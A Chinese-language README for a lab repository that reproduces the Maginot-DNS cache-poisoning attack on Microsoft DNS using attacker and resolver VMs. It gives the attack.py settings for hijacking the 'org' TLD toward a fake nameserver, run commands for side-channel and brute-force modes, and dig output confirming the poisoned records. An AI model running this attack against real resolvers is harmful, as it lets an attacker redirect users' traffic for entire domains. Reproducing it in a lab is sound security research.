# mdns-vm
## 说明
本仓库环境用于虚拟机环境复现Maginot-DNS攻击(MS DNS环境)

## 环境搭建
访问[云盘地址](https://pan.baidu.com/s/1GTnhVTFiyf0XS3RvUP4Mog?pwd=qbvr)获取`attacker`与`cdns`的虚拟机镜像

- 使用PVE系统，直接上传两个镜像备份，然后点击`restore`即可恢复
- 使用VMvare等使用`.vmdk`格式的镜像，参见[该工具](https://github.com/astroicers/zst2vmdk)将`.vma.zst`转为`.vmdk`


`attacker`
- 修改`attack.py`IP属性
  ```py
    VICTIM_DNS_SERVER = "10.2.0.2" # 修改为CDNS服务器地址
    ATTACKER_IP = "10.2.0.3" # 修改为当前attacker地址
    TRIGGER_DOMAIN = "example.com"
    TARGET_TLD_TO_HIJACK = "org"
    FAKE_NS_DOMAIN = "kie-chi.com."
    FAKE_NS_IP = "59.110.55.234"
  ```
`cdns`
- 修改`cdns`属性
  - 打开`DNS`服务的`DNS manager`，修改`Conditional Forward`的`example.com`转发的IP地址为`attacker`地址

## 实验复现
为简化实验环境与最大限度复现实验效果，`attacker`本身部署有权威服务器(即`attacker`同时有权威服务器以及攻击者两个角色)，且该权威服务器与`attack.py`进行通信，**可以泄露关键信息**，`attack`可以采用多种模式利用或不利用接收到的信息模拟多种情况

### 环境激活
在`attacker`中激活python虚拟环境，并运行server
```shell
    source venv/bin/activate
    tmux
    python3 server.py
```

### 模式一
极简攻击模式，完全利用权威服务器提供的侧信道(`TXID`、`Source Port`)，一次达成攻击目的，模拟的是真实场景下的中间人攻击
- 配置
    ```python
    # --- PORT Configuration ---
    # - Set to a range(...) to enable port brute-force mode.
    # - Set to None to enable precise port mode (fetches from side-channel).
    PORT_RANGE = None
    # (Brute-force mode only) Number of ports to guess per round.
    PORT_NUM = 20

    # --- Transaction ID (TXID) Configuration ---
    # - Set to a range(...) to enable TXID brute-force mode.
    # - Set to None to enable precise TXID mode (fetches from side-channel).
    ID_RANGE = None
    # (Brute-force mode only) Number of TXIDs to guess per round.
    ID_NUM = 5

    ROUND_MAX = -1 # Maximum number of rounds to attempt, set -1 for unlimited
    ```
- 攻击
    ```shell
    docker compose exec -it attacker python3 attack.py

    [INFO] Round 1: Starting...
    [INFO] Round 1: Waiting for side-channel intelligence...
    [INFO] Round 1: Sending 20 spoofed packets...

    [SUCCESS] Cache poisoned successfully in round 1!
    ```

### 模式二(推荐复现`TXID`)
本环境采用`MS DNS`作为CDNS，其`Source Port`范围小，一般集中在2500以内

单独将`TXID`或者`Source Port`设置为已知的范围，另一个继续**利用侧信道的信息**
- 设置`TXID`，`Source Port`保持利用信息时：相当于kaminsky攻击
- 设置`Source Port`, `TXID`保持利用信息时：相当于流量泛洪进行暴力猜解`TXID`，实验环境无法达到论文中的高带宽、高负载环境时，可以使用该方式模拟
<br>
<br>
<!-- fdsfa -->

- 配置
    ```python
    # --- PORT Configuration ---
    # - Set to a range(...) to enable port brute-force mode.
    # - Set to None to enable precise port mode (fetches from side-channel).
    PORT_RANGE = range(51000, 53500)
    # (Brute-force mode only) Number of ports to guess per round.
    PORT_NUM = 20

    # --- Transaction ID (TXID) Configuration ---
    # - Set to a range(...) to enable TXID brute-force mode.
    # - Set to None to enable precise TXID mode (fetches from side-channel).
    ID_RANGE = None
    # (Brute-force mode only) Number of TXIDs to guess per round.
    ID_NUM = 60

    ROUND_MAX = -1 # Maximum number of rounds to attempt, set -1 for unlimited
    ```
- 攻击
    ```shell
    docker compose exec -it attacker python3 attack.py

    [INFO] Round 1999: Poisoning check skipped
    [INFO] Round 2000: Starting...
    [INFO] Round 2000: Waiting for side-channel intelligence...
    [INFO] Round 2000: Sending 60 spoofed packets...

    [SUCCESS] Cache poisoned successfully in round 2000!
    [INFO] Round 2000: Reached maximum iterations, stopping.
    ```

### 模式三
完全暴力猜解，完全不利用提供的信息进行攻击


### 攻击结果
`org`域的NS记录被篡改为`kie-chi.com`，该域名是一个能够正常访问的域名
- 验证攻击结果
    ```shell
    docker compose exec -it attacker dig @10.2.0.2 org NS
    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.2.0.2 org NS
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51125
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 1232
    ; COOKIE: 0eb1568a28bcf538010000006897002a6aed9abe6c649a10 (good)
    ;; QUESTION SECTION:
    ;org.                           IN      NS

    ;; ANSWER SECTION:
    org.                    3586    IN      NS      kie-chi.com.

    ;; ADDITIONAL SECTION:
    kie-chi.com.            3586    IN      A       59.110.55.234

    ;; Query time: 0 msec
    ;; SERVER: 10.2.0.2#53(10.2.0.2) (UDP)
    ;; WHEN: Sat Aug 09 08:00:42 UTC 2025
    ;; MSG SIZE  rcvd: 101
    ```
    ```shell
    docker compose exec -it attacker dig @10.2.0.2 www.org  
    
    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.2.0.2 www.org
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29247
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 1232
    ; COOKIE: d64ccc96cec86be2010000006896ffda99accbeeb9787deb (good)
    ;; QUESTION SECTION:
    ;www.org.                       IN      A

    ;; ANSWER SECTION:
    www.org.                86400   IN      A       1.2.3.4

    ;; Query time: 449 msec
    ;; SERVER: 10.2.0.2#53(10.2.0.2) (UDP)
    ;; WHEN: Sat Aug 09 07:59:22 UTC 2025
    ;; MSG SIZE  rcvd: 80
    ```